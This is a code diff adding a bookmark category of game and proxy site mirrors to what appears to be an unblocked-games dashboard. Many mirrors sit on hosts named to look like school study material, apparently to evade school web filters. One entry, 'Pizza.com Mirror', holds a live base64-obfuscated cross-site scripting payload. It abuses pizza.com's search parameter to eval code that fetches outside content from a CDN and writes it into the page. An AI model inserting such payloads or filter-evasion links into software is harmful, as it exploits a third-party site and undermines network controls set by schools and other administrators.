@@ -1495,7 +1495,8 @@
       categories: [
         { id: "cat_movies", title: "Movies/Shows", side: "left", order: 0, builtIn: true, hidden: false, subSections: [{ id: "builtin", title: "Built-In", builtIn: true }, { id: "naenae", title: "Nae-Nae", builtIn: true, defaultCollapsed: true }, { id: "user", title: "Your Bookmarks", builtIn: true }] },
         { id: "cat_anime", title: "Anime/Manga", side: "right", order: 0, builtIn: true, hidden: false, subSections: [{ id: "builtin", title: "Built-In", builtIn: true }, { id: "user", title: "Your Bookmarks", builtIn: true }] },
-        { id: "cat_games", title: "Games", side: "bottom", order: 0, builtIn: true, hidden: false, subSections: [{ id: "builtin", title: "Built-In", builtIn: true }, { id: "user", title: "Your Bookmarks", builtIn: true }] }
+        { id: "cat_games", title: "Games", side: "bottom", order: 0, builtIn: true, hidden: false, subSections: [{ id: "builtin", title: "Built-In", builtIn: true }, { id: "user", title: "Your Bookmarks", builtIn: true }] },
+        { id: "cat_op_websites", title: "OP Websites", side: "bottom", order: 1, builtIn: true, hidden: false, subSections: [{ id: "browser_games", title: "Browser/Games", icon: "globe", builtIn: true }, { id: "docs_games", title: "Docs/Games", icon: "book", builtIn: true }, { id: "user", title: "Your Bookmarks", builtIn: false }] }
       ],
       bookmarks: [
         { id: "bm_everythingmoe", categoryId: "cat_anime", title: "EverythingMoe", url: "https://everythingmoe.com/", type: "bookmark", icon: "preset:list", builtIn: true, hidden: false, order: 0, subBookmarks: [] },
@@ -1569,7 +1570,108 @@
             { id: "sub_bloxcraft_5kh0", title: "Bloxcraft (5kh0)", url: "https://5kh0.github.io", icon: "" },
             { id: "sub_bloxcraft_fastly", title: "Bloxcraft (Fastly)", url: "https://bloxcraftubg.freetls.fastly.net/games/", icon: "https://www.google.com/s2/favicons?domain=bloxcraftubg.freetls.fastly.net&sz=64" }
           ]
-        }
+        },
+        {
+          id: "bm_aether",
+          categoryId: "cat_op_websites",
+          subSectionId: "browser_games",
+          title: "Aether",
+          url: "https://actstudy.s3.us-east-1.amazonaws.com/index.html",
+          type: "folder_bookmark",
+          icon: "/proxy/https://actstudy.s3.us-east-1.amazonaws.com/aether.svg",
+          builtIn: true,
+          hidden: false,
+          order: 0,
+          subBookmarks: [
+            { id: "sub_aether_1", title: "Dogestudy Mirror", url: "https://dogestudy.aether.samirchand.com.np/", icon: "https://www.google.com/s2/favicons?domain=dogestudy.aether.samirchand.com.np&sz=64" },
+            { id: "sub_aether_2", title: "AetherK12 S3 Mirror 1", url: "https://aetherk12.s3.amazonaws.com/index.html", icon: "https://www.google.com/s2/favicons?domain=aetherk12.s3.amazonaws.com&sz=64" },
+            { id: "sub_aether_3", title: "AetherK12 S3 Mirror 2", url: "https://s3.amazonaws.com/aetherk12/index.html", icon: "https://www.google.com/s2/favicons?domain=s3.amazonaws.com&sz=64" },
+            { id: "sub_aether_4", title: "AdvancedAlg2 S3 Mirror 1", url: "https://advancedalg2.s3.amazonaws.com/index.html", icon: "https://www.google.com/s2/favicons?domain=advancedalg2.s3.amazonaws.com&sz=64" },
+            { id: "sub_aether_5", title: "AdvancedAlg2 S3 Mirror 2", url: "https://s3.amazonaws.com/advancedalg2/index.html", icon: "https://www.google.com/s2/favicons?domain=s3.amazonaws.com&sz=64" },
+            { id: "sub_aether_6", title: "SchoolCDN S3 Mirror", url: "https://schoolcdn.s3.amazonaws.com/index.html", icon: "https://www.google.com/s2/favicons?domain=schoolcdn.s3.amazonaws.com&sz=64" },
+            { id: "sub_aether_7", title: "AetherK12 US-East-1 Mirror", url: "https://s3.us-east-1.amazonaws.com/aetherk12/index.html", icon: "https://www.google.com/s2/favicons?domain=s3.us-east-1.amazonaws.com&sz=64" },
+            { id: "sub_aether_8", title: "AdvancedAlg2 US-East-1 Mirror", url: "https://advancedalg2.s3.us-east-1.amazonaws.com/index.html", icon: "https://www.google.com/s2/favicons?domain=advancedalg2.s3.us-east-1.amazonaws.com&sz=64" },
+            { id: "sub_aether_9", title: "SchoolCDN Dualstack Mirror", url: "https://schoolcdn.s3.dualstack.us-east-1.amazonaws.com/index.html", icon: "https://www.google.com/s2/favicons?domain=schoolcdn.s3.dualstack.us-east-1.amazonaws.com&sz=64" },
+            { id: "sub_aether_10", title: "SchoolCDN FIPS Mirror", url: "https://schoolcdn.s3-fips.us-east-1.amazonaws.com/index.html", icon: "https://www.google.com/s2/favicons?domain=schoolcdn.s3-fips.us-east-1.amazonaws.com&sz=64" },
+            { id: "sub_aether_11", title: "ACTStudy S3 Mirror 1", url: "https://actstudy.s3.amazonaws.com/index.html", icon: "https://www.google.com/s2/favicons?domain=actstudy.s3.amazonaws.com&sz=64" },
+            { id: "sub_aether_12", title: "ACTStudy S3 Mirror 2", url: "https://s3.amazonaws.com/actstudy/index.html", icon: "https://www.google.com/s2/favicons?domain=s3.amazonaws.com&sz=64" },
+            { id: "sub_aether_13", title: "ACTStudy Dualstack Mirror", url: "https://actstudy.s3.dualstack.us-east-1.amazonaws.com/index.html", icon: "https://www.google.com/s2/favicons?domain=actstudy.s3.dualstack.us-east-1.amazonaws.com&sz=64" },
+            { id: "sub_aether_14", title: "ACTStudy US-East-1 Mirror", url: "https://s3.us-east-1.amazonaws.com/actstudy/index.html", icon: "https://www.google.com/s2/favicons?domain=s3.us-east-1.amazonaws.com&sz=64" },
+            { id: "sub_aether_15", title: "ACTStudy FIPS Mirror 1", url: "https://actstudy.s3-fips.us-east-1.amazonaws.com/index.html", icon: "https://www.google.com/s2/favicons?domain=actstudy.s3-fips.us-east-1.amazonaws.com&sz=64" },
+            { id: "sub_aether_16", title: "ACTStudy FIPS Mirror 2", url: "https://actstudy.s3-fips.dualstack.us-east-1.amazonaws.com/index.html", icon: "https://www.google.com/s2/favicons?domain=actstudy.s3-fips.dualstack.us-east-1.amazonaws.com&sz=64" }
+          ]
+        },
+        { id: "bm_korona", categoryId: "cat_op_websites", subSectionId: "browser_games", title: "Korona", url: "https://korona.lat/dashboard", type: "bookmark", icon: "https://www.google.com/s2/favicons?domain=korona.lat&sz=64", builtIn: true, hidden: false, order: 1, subBookmarks: [] },
+        { id: "bm_nexus", categoryId: "cat_op_websites", subSectionId: "browser_games", title: "Nexus", url: "https://car-meow.github.io/toothbrush/", type: "bookmark", icon: "https://www.google.com/s2/favicons?domain=car-meow.github.io&sz=64", builtIn: true, hidden: false, order: 2, subBookmarks: [] },
+        { id: "bm_flux", categoryId: "cat_op_websites", subSectionId: "browser_games", title: "Flux", url: "https://web.flux.focuznow.com/", type: "folder_bookmark", icon: "/proxy/https://web.flux.focuznow.com/assets/flux-mark.webp", builtIn: true, hidden: false, order: 3, subBookmarks: [] },
+        { id: "bm_opium", categoryId: "cat_op_websites", subSectionId: "browser_games", title: "Opium", url: "https://storage.googleapis.com/opiumbest/index.html", type: "bookmark", icon: "https://www.google.com/s2/favicons?domain=storage.googleapis.com&sz=64", builtIn: true, hidden: false, order: 4, subBookmarks: [] },
+        {
+          id: "bm_polaris",
+          categoryId: "cat_op_websites",
+          subSectionId: "browser_games",
+          title: "Polaris",
+          url: "https://mathplayground.explosionlearning.org/",
+          type: "folder_bookmark",
+          icon: "https://www.google.com/s2/favicons?domain=mathplayground.explosionlearning.org&sz=64",
+          builtIn: true,
+          hidden: false,
+          order: 5,
+          subBookmarks: [
+            { id: "sub_polaris_1", title: "Goontopia Mirror", url: "https://goontopia.me/", icon: "https://www.google.com/s2/favicons?domain=goontopia.me&sz=64" },
+            { id: "sub_polaris_2", title: "Polara Render 1", url: "https://polara-1.onrender.com/", icon: "https://www.google.com/s2/favicons?domain=polara-1.onrender.com&sz=64" },
+            { id: "sub_polaris_3", title: "Polaris Foff Mirror", url: "https://polarisisthebest.foff.ch/", icon: "https://www.google.com/s2/favicons?domain=polarisisthebest.foff.ch&sz=64" },
+            { id: "sub_polaris_4", title: "Puppypoop Flort Mirror", url: "https://puppypoop.flort.com.tr/", icon: "https://www.google.com/s2/favicons?domain=puppypoop.flort.com.tr&sz=64" },
+            { id: "sub_polaris_5", title: "Polara Render 2", url: "https://polara-i1r7.onrender.com/", icon: "https://www.google.com/s2/favicons?domain=polara-i1r7.onrender.com&sz=64" },
+            { id: "sub_polaris_6", title: "Downing DNS Mirror", url: "https://poopoo.downingdns.xyz/", icon: "https://www.google.com/s2/favicons?domain=poopoo.downingdns.xyz&sz=64" },
+            { id: "sub_polaris_7", title: "Math Skills Algebra Mirror", url: "https://mathskillsalgebra.pepikutan.net/", icon: "https://www.google.com/s2/favicons?domain=mathskillsalgebra.pepikutan.net&sz=64" },
+            { id: "sub_polaris_8", title: "Lafairs Mirror", url: "https://lafairs.sh8.no/", icon: "https://www.google.com/s2/favicons?domain=lafairs.sh8.no&sz=64" }
+          ]
+        },
+        {
+          id: "bm_arctic",
+          categoryId: "cat_op_websites",
+          subSectionId: "browser_games",
+          title: "Arctic",
+          url: "https://storage.googleapis.com/math-homework/index.html",
+          type: "folder_bookmark",
+          icon: "https://www.google.com/s2/favicons?domain=storage.googleapis.com&sz=64",
+          builtIn: true,
+          hidden: false,
+          order: 6,
+          subBookmarks: [
+            { id: "sub_arctic_1", title: "Arctic Games GCS", url: "https://storage.googleapis.com/arctic-games/arctic.html", icon: "https://www.google.com/s2/favicons?domain=storage.googleapis.com&sz=64" },
+            { id: "sub_arctic_2", title: "Padlet Mirror", url: "https://uploads-usc1.padletcdn.com/4865083536/4e7c634432b37bba781530a0802763b7/arctic.html#/home", icon: "https://www.google.com/s2/favicons?domain=padletcdn.com&sz=64" },
+            { id: "sub_arctic_3", title: "Pizza.com Mirror", url: "https://pizza.com/?s=%3Cimg%20src%20onerror=h=eval,h(atob(%27ZmV0Y2goImh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC9jcnNocWQvc3R1cmR5LWxhbXBASEVBRC9hcmN0aWMuc3ZnIikudGhlbihmdW5jdGlvbih0KXtyZXR1cm4gdC50ZXh0KCl9KS50aGVuKGZ1bmN0aW9uKHQpe2RvY3VtZW50LndyaXRlKHQpfSk7%27))%3E", icon: "https://www.google.com/s2/favicons?domain=pizza.com&sz=64" },
+            { id: "sub_arctic_4", title: "Icon Horse Mirror", url: "https://icon.horse/icon/xn--kwhenihadalife-utl6u222y.neocities.org", icon: "https://www.google.com/s2/favicons?domain=icon.horse&sz=64" },
+            { id: "sub_arctic_5", title: "FaviconAPI Mirror", url: "https://faviconapi.com/vemetric/128/png/xn--kwhenihadalife-utl6u222y.neocities.org", icon: "https://www.google.com/s2/favicons?domain=faviconapi.com&sz=64" },
+            { id: "sub_arctic_6", title: "GetFavicon Mirror", url: "https://getfavicon.dev/xn--kwhenihadalife-utl6u222y.neocities.org", icon: "https://www.google.com/s2/favicons?domain=getfavicon.dev&sz=64" },
+            { id: "sub_arctic_7", title: "Favicon IM Mirror", url: "https://a.favicon.im/xn--kwhenihadalife-utl6u222y.neocities.org?larger=true", icon: "https://www.google.com/s2/favicons?domain=a.favicon.im&sz=64" },
+            { id: "sub_arctic_8", title: "Favicon SO Mirror", url: "https://favicon.so/xn--kwhenihadalife-utl6u222y.neocities.org", icon: "https://www.google.com/s2/favicons?domain=favicon.so&sz=64" },
+            { id: "sub_arctic_9", title: "KeeWeb Favicon Mirror", url: "https://services.keeweb.info/favicon/xn--kwhenihadalife-utl6u222y.neocities.org", icon: "https://www.google.com/s2/favicons?domain=services.keeweb.info&sz=64" },
+            { id: "sub_arctic_10", title: "Vemetric Favicon Mirror", url: "https://favicon.vemetric.com/xn--kwhenihadalife-utl6u222y.neocities.org", icon: "https://www.google.com/s2/favicons?domain=favicon.vemetric.com&sz=64" },
+            { id: "sub_arctic_11", title: "Imgsrc Pub Mirror", url: "https://imgsrc.pub/favicon?url=https://xn--kwhenihadalife-utl6u222y.neocities.org", icon: "https://www.google.com/s2/favicons?domain=imgsrc.pub&sz=64" }
+          ]
+        },
+        { id: "bm_pgis2", categoryId: "cat_op_websites", subSectionId: "browser_games", title: "PGIS 2", url: "https://pgis.x10.mx/index.html", type: "bookmark", icon: "https://www.google.com/s2/favicons?domain=pgis.x10.mx&sz=64", builtIn: true, hidden: false, order: 7, subBookmarks: [] },
+        { id: "bm_ubgdir", categoryId: "cat_op_websites", subSectionId: "docs_games", title: "UBGDir", url: "https://0800webdev.github.io/UBGdir/", type: "bookmark", icon: "/proxy/https://0800webdev.github.io/UBGdir/favicon.png", builtIn: true, hidden: false, order: 0, subBookmarks: [] },
+        { id: "bm_the_wagon", categoryId: "cat_op_websites", subSectionId: "docs_games", title: "The Wagon", url: "https://the-wagonization.github.io/The-Wagon-Site/Pages/Home.html", type: "folder_bookmark", icon: "https://ssl.gstatic.com/docs/documents/images/kix-favicon7.ico", builtIn: true, hidden: false, order: 1, subBookmarks: [] },
+        {
+          id: "bm_ultimate_doc_of_docs",
+          categoryId: "cat_op_websites",
+          subSectionId: "docs_games",
+          title: "Ultimate Doc Of Docs",
+          url: "https://0800webdev.github.io/The-Ultimate-Doc-Of-Docs/",
+          type: "folder_bookmark",
+          icon: "https://www.google.com/s2/favicons?domain=0800webdev.github.io&sz=64",
+          builtIn: true,
+          hidden: false,
+          order: 2,
+          subBookmarks: [
+            { id: "sub_udod_google_doc", title: "Google Doc Mirror", url: "https://docs.google.com/document/d/1foYnf3pqg00PbEMGnOKmdC0fJsUE_w_lmUZjGTHJtRo/", icon: "https://www.google.com/s2/favicons?domain=docs.google.com&sz=64" }
+          ]
+        },
+        { id: "bm_project_19", categoryId: "cat_op_websites", subSectionId: "docs_games", title: "Project 19", url: "https://docs.google.com/document/d/1rlluLiVQc4DGr-kgcoLoF0qb4q1ooTRLj6RPiUxAZCo/", type: "folder_bookmark", icon: "https://ssl.gstatic.com/docs/documents/images/kix-favicon7.ico", builtIn: true, hidden: false, disableQuickSaveWidget: true, order: 3, subBookmarks: [] },
+        { id: "bm_project_idk", categoryId: "cat_op_websites", subSectionId: "docs_games", title: "Project IDK", url: "https://docs.google.com/document/d/1BDRltDqQLuyITBddWOGREhmGnNK8zR-kZ2-mHkkQ9rw/edit?tab=t.0", type: "folder_bookmark", icon: "https://ssl.gstatic.com/docs/documents/images/kix-favicon7.ico", builtIn: true, hidden: false, disableQuickSaveWidget: true, order: 4, subBookmarks: [] }
       ]
     };
 
